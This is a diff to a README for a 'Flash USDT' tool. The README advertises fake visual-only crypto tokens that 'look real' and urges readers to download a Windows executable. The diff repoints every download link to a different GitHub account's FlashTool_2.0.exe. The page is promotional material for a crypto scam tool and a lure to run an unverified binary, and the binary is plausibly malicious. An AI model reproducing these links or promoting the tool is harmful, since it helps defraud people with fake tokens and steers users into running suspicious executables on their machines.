@@ -5,7 +5,7 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 <h1 align="center"><b>🚀 Download Now</b></h1>
 
 <p align="center">
-  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/Flashing.Software.exe">
+  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/FlashUSDT/FlashTool_2.0.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
@@ -13,7 +13,7 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 > 💡 Perfect for testing, demos, or messing with your crypto friends. Looks real. Feels real. Isn't real.
 
 <p align="center">
- <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/Flashing.Software.exe">
+ <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/FlashUSDT/FlashTool_2.0.exe">
 </p>
 
 ## 🚀 Features
@@ -37,7 +37,7 @@ All tokens are **visual-only**, designed to simulate real assets:
 - **DAI (Multi-Collateral Dai)**
 
 <p align="center">
-  <a href="https://github.com/alpha-arb/Flash-tool-USDT-bot-sender/releases/download/Tool/Flashing.Software.exe">
+  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/FlashUSDT/FlashTool_2.0.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
